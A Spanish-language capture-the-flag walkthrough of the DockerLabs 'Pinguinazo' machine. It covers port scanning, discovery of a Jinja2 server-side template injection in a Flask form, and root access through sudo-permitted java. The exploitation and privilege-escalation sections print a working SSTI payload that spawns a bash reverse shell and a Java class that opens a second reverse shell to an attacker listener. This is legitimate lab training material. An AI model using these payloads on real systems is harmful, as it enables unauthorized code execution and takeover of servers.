#MAQUINA #DOCKERLABS #FACIL 
#SSTI
#JAVA_REVERSE_SHELL
<hr>

# RECONOCIMIENTO

Vamos a resolver **Pinguinazo** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 13:31 CET
Initiating ARP Ping Scan at 13:31
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:31, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:31
Scanning 172.17.0.2 [65535 ports]
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:31, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-04 13:31:59 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE REASON
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **5000** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p5000 172.17.0.2                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 13:32 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000020s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Wed, 04 Dec 2024 12:32:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1718
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Pingu Flask Web</title>
|     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
|     </head>
|     <body>
|     <div class="container mt-5">
|     class="text-center">PinguRegistro</h1>
|     <form method="post" action="/greet">
|     <div class="form-group">
|     <label for="name">PinguNombre</label>
|     <input type="text" class="form-control" id="name" name="name" placeholder="Enter your name">
|     </div>
|     <div class="form-group">
|     <label for="birthday">Pi
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/4%Time=67504BFA%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,765,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.12\.3\r\nDate:\x20Wed,\x2004\x20Dec\x202024\x2012:32:58\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201718\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Pingu\x20Flask\x20Web</
SF:title>\n\x20\x20\x20\x20<link\x20href=\"https://stackpath\.bootstrapcdn
SF:\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\"
SF:>\n</head>\n<body>\n\x20\x20\x20\x20<div\x20class=\"container\x20mt-5\"
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"text-center\">PinguRe
SF:gistro</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<form\x20method=\"post\"\x
SF:20action=\"/greet\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<
SF:div\x20class=\"form-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20<label\x20for=\"name\">PinguNombre</label>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20t
SF:ype=\"text\"\x20class=\"form-control\"\x20id=\"name\"\x20name=\"name\"\
SF:x20placeholder=\"Enter\x20your\x20name\">\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<div\x20class=\"form-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<label\x20for=\"birthday\">Pi")%r(RTSPRequ
SF:est,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<he
SF:ad>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x
SF:20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x
SF:20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\
SF:x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>
SF:\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.45 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 13:34 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
5000/tcp open  upnp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

whatweb "http://172.17.0.2:5000/"
http://172.17.0.2:5000/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], Email[admin@pingulab.lab], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[172.17.0.2], JQuery, Python[3.12.3], Script, Title[Pingu Flask Web], Werkzeug[3.0.1]

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Utiliza **Python** , posible SSTI.

# EXPLOTACION

Al revisar la web que hay en el puerto 5000, vemos que hay una especie de login. Si lo rellenamos, nos muestra un Hello y lo que metamos de nombre. Si ponemos como nombre:

   ```bash

{{7 + 7}} -> HEllo 14

```

Por lo que nos hace la suma y estaríamos ante un **SSTI** , así que vamos a meter lo siguiente para darnos una reverse shell , mientras nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**):

   ```bash

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1 "').read() }}

```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
pinguinazo@203f66c8e96a:~$ sudo -l
sudo -l
Matching Defaults entries for pinguinazo on 203f66c8e96a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pinguinazo may run the following commands on 203f66c8e96a:
    (ALL) NOPASSWD: /usr/bin/java

```

Vemos **java** con permisos SUDO , nos ponemos en escucha en el puerto 444 :
   ```bash
pinguinazo@203f66c8e96a:~$ cat shell.java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
pinguinazo@203f66c8e96a:~$ javac shell.java 
Note: shell.java uses or overrides a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
pinguinazo@203f66c8e96a:~$ sudo java shell


```

   ```bash
   
nc -nlvp 444
listening on [any] 444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39764
root@203f66c8e96a:/home/pinguinazo# 



```

**YA ESTAMOS COMO ROOT.**